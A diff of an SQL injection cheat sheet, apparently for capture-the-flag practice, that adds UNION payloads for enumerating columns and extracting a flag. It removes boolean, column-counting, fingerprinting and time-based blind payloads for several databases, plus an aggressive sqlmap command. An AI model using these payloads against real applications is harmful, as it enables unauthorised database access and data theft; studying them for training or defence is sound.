@@ -512,118 +512,21 @@ Enumerate columns in a specific table
 ```
 
 ```sql
-')) UNION ALL SELECT 1, column_name, "", 1 FROM information_schema.columns WHERE table_name='hiddenTable' -- -
+')) UNION ALL SELECT 1, column_name, "", 1 FROM information_schema.columns WHERE table_name='targetTable' -- -
 ```
 
 ```sql
-')) UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='hiddenTable' AND column_name='flag' -- -
+')) UNION SELECT 1, column_name, '', 1 FROM information_schema.columns WHERE table_name='targetTable' AND column_name='flag' -- -
 ```
 
 ```sql
-
+')) UNION SELECT 1, CONCAT(table_name, '.', column_name), '', 1 FROM information_schema.columns WHERE table_schema='target' -- -
 ``` 
 
-
-
-## Step 1: Test for SQL Injection (Boolean-based)
-
-### True/False Injection Test
-
 ```sql
-?id=1' AND 1=1-- -
-?id=1' AND 1=2-- -
+')) UNION ALL SELECT 1, flag, '', 1 FROM app.targetTable -- -
 ```
 
-### Step 2: Find Number of Columns (UNION SELECT NULL)
-
 ```sql
-?id=1' UNION SELECT NULL-- -
-?id=1' UNION SELECT NULL, NULL-- -
-?id=1' UNION SELECT NULL, NULL, NULL-- -
-?id=1' UNION SELECT NULL, NULL, NULL, NULL-- -
+
 ```
-
-### Step 3: Test Column Reflection (Identify Output Column)
-
-```sql
-?id=1' UNION SELECT 1,2,3-- -
-```
-
-### Step 4: Identify Database Backend (Fingerprinting)
-
-```sql
-?id=1' UNION SELECT 1, @@version, 3-- -
-?id=1' UNION SELECT 1, version(), 3-- -
-?id=1' UNION SELECT 1, database(), 3-- -
-```
-
-MySQL
-
-```sql
-?id=1' UNION SELECT 1, @@version, 3-- -
-?id=1' UNION SELECT 1, version(), 3-- -
-?id=1' UNION SELECT 1, database(), 3-- -
-```
-
-SQL Server
-
-```sql
-?id=1' UNION SELECT 1, @@version, 3-- -
-?id=1' UNION SELECT 1, DB_NAME(), 3-- -
-?id=1' UNION SELECT 1, SYSTEM_USER, 3-- -
-```
-
-Oracle
-
-```sql
-?id=1' UNION SELECT 1, banner, 3 FROM v$version-- -
-?id=1' UNION SELECT 1, version, 3 FROM v$instance-- -
-?id=1' UNION SELECT 1, user, 3 FROM dual-- -
-```
-PostgreSQL
-
-```sql
-?id=1' UNION SELECT 1, version(), 3-- -
-?id=1' UNION SELECT 1, current_database(), 3-- -
-?id=1' UNION SELECT 1, current_user, 3-- -
-```
-
-### If No Output: Try Time-Based Blind SQLi
-
-MYSQL
-
-```sql
-?id=1' AND SLEEP(5)-- -
-```
-
-SQL Server
-
-```sql
-?id=1' WAITFOR DELAY '0:0:5'-- -
-```
-
-Oracle
-
-```sql
-?id=1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
-```
-
-PostgreSQL
-
-```sql
-?id=1'; SELECT pg_sleep(5)-- -
-```
-
-Simple OR condition test:
-
-```sql
-?id=1' OR '1'='1-- -
-```
-
-### Optional Tool: sqlmap
-
-```sql
-sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch --dbs
-```
-
-
